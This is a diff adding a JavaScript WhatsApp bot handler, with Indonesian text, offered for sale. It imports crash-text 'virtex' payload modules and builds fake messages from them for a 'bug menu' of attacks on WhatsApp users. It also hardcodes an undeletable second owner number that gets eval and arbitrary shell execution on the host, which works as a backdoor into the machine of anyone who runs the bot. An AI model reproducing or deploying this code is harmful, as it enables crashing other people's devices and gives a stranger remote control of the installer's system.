@@ -1,0 +1,421 @@
+const { modul } = require('./module');
+const { axios, baileys, chalk, cheerio, child_process, crypto, fs, md5, moment, ms, nodemailer, speed, util } = modul;
+const { Configuration, OpenAIApi } = modul.openai;
+const { exec, spawn, execSync } = child_process
+const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
+const { formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, reSize, generateProfilePicture } = require('./lib/myfunc')
+const { buttonkal } = require('./virtex/nyxbutton')
+const { bugsw } = require('./virtex/bugsw')
+const { place } = require('./virtex/place')
+const { iphone } = require('./virtex/iphone')
+const { iphone1 } = require('./virtex/iphone1')
+const { iphone2 } = require('./virtex/iphone2')
+const { iphone3 } = require('./virtex/iphone3')
+const { iphone4 } = require('./virtex/iphone4')
+const { iphone5 } = require('./virtex/iphone5')
+const { iphone6 } = require('./virtex/iphone6')
+const { buttonvirus } = require('./lib/buttonvirus')
+const { virtex, vipi } = require('./virtex/virtex')
+const { ngazap } = require('./virtex/ngazap')
+const { virkon1 } = require('./virtex/virkon1')
+const { virtex2 } = require('./virtex/virtex2')
+const { virtex3 } = require('./virtex/virtex3')
+const os = require('os')
+const { color, bgcolor } = require('./lib/color')
+const owner = JSON.parse(fs.readFileSync('./database/owner.json').toString())
+const premium = JSON.parse(fs.readFileSync('./database/premium.json').toString())
+const setting = JSON.parse(fs.readFileSync('./config.json').toString())
+
+
+const ownerasli = [`${setting.ownerNumber}`, "6281216465289"] //ownerasli gabisa di delowner
+const prefa = ['','!','.',',','🐤','🗿']
+const ownerNumber = setting.ownerNumber
+const botName = setting.botName
+const ownerName = setting.ownerName
+const openAI_Apikey = setting.openAIApikey
+
+
+global.db = JSON.parse(fs.readFileSync('./database/database.json'))
+if (global.db) global.db = {
+sticker: {},
+database: {},
+game: {},
+others: {},
+users: {},
+chats: {},
+...(global.db || {})
+}
+
+
+
+module.exports = lexx = async (lexx, msg, chatUpdate, store) => {
+try {
+const body = (msg.mtype === 'conversation') ? msg.message.conversation : (msg.mtype == 'imageMessage') ? msg.message.imageMessage.caption : (msg.mtype == 'videoMessage') ? msg.message.videoMessage.caption : (msg.mtype == 'extendedTextMessage') ? msg.message.extendedTextMessage.text : (msg.mtype == 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage.selectedButtonId : (msg.mtype == 'listResponseMessage') ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : (msg.mtype == 'templateButtonReplyMessage') ? msg.message.templateButtonReplyMessage.selectedId : (msg.mtype === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId || msg.text) : ''
+const budy = (typeof msg.text == 'string' ? msg.text : '')
+const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi)[0] : "!" : prefa ?? global.prefix
+const content = JSON.stringify(msg.message)
+const { type, quotedMsg, mentioned, now, fromMe } = msg
+const isCmd = body.startsWith(prefix)
+const from = msg.key.remoteJid
+
+const isGroup = msg.chat.endsWith('@g.us')
+const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
+const args = body.trim().split(/ +/).slice(1)
+const pushname = msg.pushName || "No Name"
+const botNumber = await lexx.decodeJid(lexx.user.id)
+const groupMetadata = msg.isGroup ? await lexx.groupMetadata(msg.chat).catch(e => {}) : ''
+const participants = msg.isGroup ? await groupMetadata.participants : ''
+
+const groupName = msg.isGroup ? groupMetadata.subject : ''
+const groupAdmins = msg.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
+const groupOwner = msg.isGroup ? groupMetadata.owner : ''
+const groupMembers = msg.isGroup ? groupMetadata.participants : ''
+const isBotAdmins = msg.isGroup ? groupAdmins.includes(botNumber) : false
+const isGroupAdmins = msg.isGroup ? groupAdmins.includes(msg.sender) : false
+const isAdmins = msg.isGroup ? groupAdmins.includes(msg.sender) : false
+
+const sender = isGroup ? (msg.key.participant ? msg.key.participant : msg.participant) : msg.key.remoteJid
+const isPremium = [botNumber, ...ownerasli, ...owner, ...premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(msg.sender)
+const itsMe = msg.sender == botNumber ? true : false
+const text = q = args.join(" ")
+const isRealOwner = [botNumber, ...ownerasli].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(msg.sender)
+const isOwner = [botNumber, ...ownerasli, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(msg.sender)
+const quoted = msg.quoted ? msg.quoted : msg
+const mime = (quoted.msg || quoted).mimetype || ''
+const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
+const dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
+const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
+const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
+const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
+const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')   
+const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')  
+const isMedia = /image|video|sticker|audio/.test(mime)
+
+const reply = (teks) => {
+return lexx.sendMessage(msg.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `${botName}`,"body": ``, "previewType": "PHOTO","thumbnailUrl": `https://github.com/NYX095`,"thumbnail": "", "sourceUrl": ""}}}, { quoted: msg })}
+
+try {
+const isNumber = x => typeof x === 'number' && !isNaN(x)
+const user = global.db.users[msg.sender]
+if (typeof user !== 'object') global.db.users[msg.sender] = {}
+const chats = global.db.chats[msg.chat]
+if (typeof chats !== 'object') global.db.chats[msg.chat] = {}
+} catch (err) {
+console.error(err)
+}
+
+if (!lexx.public) {
+if (!msg.key.fromMe) return
+}
+
+if (!msg.isGroup && isCmd && !fromMe) {
+console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(msg.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname))
+}
+if (msg.isGroup && isCmd && !fromMe) {
+console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(msg.messageTimestamp *1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
+}
+
+if (msg.sender.startsWith('212')) return lexx.updateBlockStatus(msg.sender, 'block')
+
+const vtroli = {key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 99999,status: 200, thumbnail: await reSize(thumb, 100, 100), surface: 200, message: `${iphone6} ${buttonkal} ${virtex2}`, orderTitle: `${ucapanWaktu}`, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
+
+const vkatalog = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(msg.chat ? {remoteJid: "status@broadcast" } : {})}, message: { "productMessage": { "product": { "productImage":{ "mimetype": "image/jpeg", "jpegThumbnail": await reSize(thumb, 100, 100)},"title": `${bugsw}${buttonkal}`, "description": `${bugsw}${buttonkal}`, "currencyCode": "IDR", "retailerId": `${bugsw}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}} 
+
+const vtext = {
+key: {
+fromMe: false, 
+participant: `0@s.whatsapp.net`, 
+...({ remoteJid: "" }) 
+}, 
+message: { 
+"imageMessage": { 
+"mimetype": "image/jpeg", 
+"caption": `${buttonvirus}`, 
+"jpegThumbnail": ppnyauser
+}
+}
+}
+
+function mentions(teks, mems = [], id) {
+if (id == null || id == undefined || id == false) {
+let res = lexx.sendMessage(from, { text: teks, mentions: mems }, { quoted: msg })
+return res
+} else {
+let res = lexx.sendMessage(from, { text: teks, mentions: mems }, { quoted: msg })
+return res
+}
+}
+
+const pickRandom = (arr) => {
+return arr[Math.floor(Math.random() * arr.length)]
+}
+
+if (command) {
+lexx.readMessages([msg.key])
+}
+
+let fakenya = {key : {participant : '0@s.whatsapp.net', ...(msg.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `LexBotzz...🌷`, jpegThumbnail: fs.readFileSync('./lib/logo.jpg')}}}
+
+switch (command) {
+case 'menu': {
+let ownerNya = setting.ownerNumber
+menu =`═════[ ${botName}-𝙈𝘿 ]═════
+
+${ucapanWaktu} @${sender.split('@')[0]}
+
+╔═══《 Info BOT 》════
+╠❏ Owner: @${ownerNya.split('@')[0]}
+╠❏ Nama Bot : ${botName}
+╠❏ Nama Owner : ${ownerName}
+╠❏ Running : ${setting.Terminal}
+╠❏ Prefix : ( ALL PREFIX )
+╚════════════════
+╔════《 Time ID 》════⊱
+╠〉WIT : ${wit}
+╠〉WIB : ${wib}
+╠〉WITA : ${wita}
+╠〉TANGGALl : ${tanggal}
+╚════════════════
+╔════《 List Menu 》════⊱
+╠〉${prefix}ownermenu
+╠〉${prefix}bugmenu
+╠〉${prefix}groupmenu
+╚════════════════
+╔════《Rules Baca😡 》════⊱
+╠〉Jeda 2 Menit
+╠〉No Spam
+╠〉Harap Sopan
+╠〉No Spam Fitur AttGc
+╚════《Powered By ${ownerName} 》════⊱`
+lexx.sendMessage(msg.chat, {text: menu, mentions: [sender]}, {quoted: msg})
+}
+break
+case 'grupmenu':{
+bug =`╔═══《 𝙂𝙍𝙊𝙐𝙋 𝙈𝙀𝙉𝙐 》═══⊱
+╠〉${prefix}kick @tag
+╠〉${prefix}group <off/on>
+╠〉${prefix}hidetag (pesannya)
+╚═════════════════`
+lexx.sendMessage(msg.chat, {text:bug}, {quoted: msg})
+}
+break
+case 'ownermenu':{
+bug = `╔═══《 𝙈𝘼𝙄𝙉 𝙈𝙀𝙉𝙐 》═══⊱
+╠〉${prefix}join <link grup>
+╠〉${prefix}stats (cek status)
+╠〉${prefix}restart (restart bot)
+╠〉${prefix}script (source code)
+╚═════════════════`
+lexx.sendMessage(msg.chat, {text:bug}, {quoted: msg})
+}
+break
+case 'bugmenu':{
+bug =`╔═══《 𝘽𝙐𝙂 𝙈𝙀𝙉𝙐 》═══⊱
+╠〉${prefix}bugemoji
+╠〉${prefix}bugverify
+╠〉${prefix}bugattack
+╚═════════════════`
+lexx.sendMessage(msg.chat, {text:bug}, {quoted: msg})
+}
+break
+case 'sc':
+case 'scbot':
+case 'script':{
+sc = `Halo Kak, Silahkan beli script bot kepada owner, Owner: https://wa.me/6281216465289\nMurah kok, Ga Sampe 50k😋`
+msg.reply(sc)
+}
+break
+case 'group': case 'grup':
+if (!isGroup) return msg.reply('Perintah ini hanya bisa digunakan digrup')
+if (!isGroupAdmins) return msg.reply('Perintah ini hanya bisa digunakan oleh Admin Grup')
+if (!isBotAdmins) return msg.reply('Bot Harus menjadi admin')
+if (args[0] == "off") {
+lexx.groupSettingUpdate(msg.chat, 'announcement').then((res) => msg.reply(jsonformat(res))).catch((err) => msg.reply(jsonformat(err)))
+} else if (args[0] == "on") {
+lexx.groupSettingUpdate(msg.chat, 'not_announcement').then((res) => msg.reply(jsonformat(res))).catch((err) => msg.reply(jsonformat(err)))
+} else {
+msg.reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : ${prefix+command} on`)
+}
+break
+case 'hidetag':{
+if (!isGroup) return msg.reply('Perintah ini hanya bisa digunakan digrup')
+if (!isGroupAdmins) return msg.reply('Perintah ini hanya bisa digunakan oleh Admin Grup')
+let mem = [];
+groupMembers.map( i => mem.push(i.id) )
+lexx.sendMessage(msg.chat, { text: q ? q : '', mentions: mem })
+}
+break
+case 'kick': {
+if (!isGroup) return msg.reply('Perintah ini hanya bisa digunakan digrup')
+if (!isBotAdmins) return msg.reply('Jadiin bot admin dong biar bisa')
+if (!isGroupAdmins) return msg.reply('Fitur ini khusus admin grup')
+let users = msg.mentionedJid[0] ? msg.mentionedJid[0] : msg.quoted ? msg.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
+await lexx.groupParticipantsUpdate(msg.chat, [users], 'remove').then((res) => msg.reply(jsonformat(res))).catch((err) => msg.reply(jsonformat(err)))
+}
+break
+case 'restart':{
+ if (!isGroup) return msg.reply(`wajib dalam grup`)
+if (!isGroupAdmins) return msg.reply(`sorry anda sepertinya bukan pemilik bot`)
+txts = `SUCCES KAK`
+msg.reply(txts)
+let cp = require('child_process')
+let { promisify } = require('util')
+let exec = promisify(cp.exec).bind(cp)
+let o
+try {
+o = exec('npm uninstall cheerio && npm i cheerio && pm2 restart next')
+} catch (e) {
+o = e
+} finally {
+let { stdout, stderr } = o
+}
+}
+break
+case 'test':
+case 'tes':
+case 'stats': {
+const used = process.memoryUsage()
+const cpus = os.cpus().map(cpu => {
+cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
+return cpu
+})
+const cpu = cpus.reduce((last, cpu, _, { length }) => {
+last.total += cpu.total
+last.speed += cpu.speed / length
+last.times.user += cpu.times.user
+last.times.nice += cpu.times.nice
+last.times.sys += cpu.times.sys
+last.times.idle += cpu.times.idle
+last.times.irq += cpu.times.irq
+return last
+}, {
+speed: 0,
+total: 0,
+times: {
+user: 0,
+nice: 0,
+sys: 0,
+idle: 0,
+irq: 0
+}
+})
+let timestamp = speed()
+let latensi = speed() - timestamp
+respon = `
+Kecepatan Respon ${latensi.toFixed(4)} _Second_ \nRuntime : ${runtime(process.uptime())}
+💻 Info Server
+RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
+`
+msg.reply(respon)
+}
+break
+case 'listowner':{
+if (!isRealOwner) return msg.reply(`sorry anda sepertinya bukan pemilik bot`)
+let listusr = `*List Owner*\n\n${owner.length}\n`
+var no = 1
+for (let x of owner) {
+listusr +=`\nUser: ${no++}\nID: ${x}\n\n`
+}
+listusr +=`Untuk menghapus user/member\nKetik ${prefix}delusr 628xxx/@tag`
+msg.reply(listusr)
+}
+break
+case 'delusr':
+if (!isGroup) return msg.reply(`wajib dalam grup`)
+if (!isRealOwner) return msg.reply(`Fitur ini khusus owner`)
+if (!args[0]) return msg.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
+ya = q.split("|")[0].replace(/[^0-9]/g, '')
+unp = owner.indexOf(ya)
+owner.splice(unp, 1)
+fs.writeFileSync('./database/userAkses.json', JSON.stringify(owner))
+delusr = ya+`@s.whatsapp.net`
+mentions(`sukses delete akses @${delusr.split('@')[0]}`, [delusr])
+break
+case 'addusr':
+if (!isGroup) return msg.reply(`wajib dalam grup`)
+if (!isRealOwner) return msg.reply(`Fitur ini khusus owner`)
+if (!args[0]) return msg.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
+yo = q.split("|")[0].replace(/[^0-9]/g, '')
+let ceknye = await lexx.onWhatsApp(yo + `@s.whatsapp.net`)
+if (ceknye.length == 0) return msg.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
+owner.push(yo)
+fs.writeFileSync('./database/userAkses.json', JSON.stringify(owner))
+addusr = yo+`@s.whatsapp.net`
+mentions(`sukses add akses @${addusr.split('@')[0]}`, [addusr])
+break
+case 'resetalldb':
+if (!isRealOwner) return msg.reply(`sorry anda sepertinya bukan pemilik bot`)
+owner.splice('[]')
+premium.splice('[]')
+fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
+fs.writeFileSync('./database/premium.json', JSON.stringify(owner))
+msg.reply(`SUKSES ✅`)
+break
+
+// BUG VERIF //
+
+
+// DISARANKAN BOT MAKE 0 CTT DAN IMMUNE BIAR GAK CRASH
+
+// ATTACK GRUP //
+case 'join':{
+if (!isOwner) return msg.reply('Owner Only')
+if (!q) return msg.reply(`Penggunaan ${prefix+command} linkgrup`)
+if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return msg.reply('Link Invalid!')
+let result = args[0].split('https://chat.whatsapp.com/')[1]
+lexx.groupAcceptInvite(result).then((res) => msg.reply(jsonformat(res))).catch((err) => msg.reply(jsonformat(err)))
+}
+break
+
+// BUG WHATSAPP KU TARUH SINI
+
+default:
+}
+if (budy.startsWith('=>')) {
+if (!isOwner) return
+function Return(sul) {
+sat = JSON.stringify(sul, null, 2)
+bang = util.format(sat)
+if (sat == undefined) {
+bang = util.format(sul)
+}
+return msg.reply(bang)
+}
+try {
+msg.reply(util.format(eval(`(async () => { ${budy.slice(3)} })()`)))
+} catch (e) {
+msg.reply(String(e))
+}
+}
+if (budy.startsWith('>')) {
+if (!isOwner) return
+try {
+let evaled = await eval(budy.slice(2))
+if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
+await msg.reply(evaled)
+} catch (err) {
+msg.reply(String(err))
+}
+}
+if (budy.startsWith('<')) {
+if (!isOwner) return
+try {
+return msg.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
+} catch (e) {
+reply(e)
+}
+}
+if (budy.startsWith('$')){
+if (!isRealOwner) return
+qur = budy.slice(2)
+exec(qur, (err, stdout) => {
+if (err) return msg.reply(`${err}`)
+if (stdout) {
+msg.reply(stdout)
+}
+})
+}
+} catch (err) {
+msg.reply(util.format(err))
+}
+} 
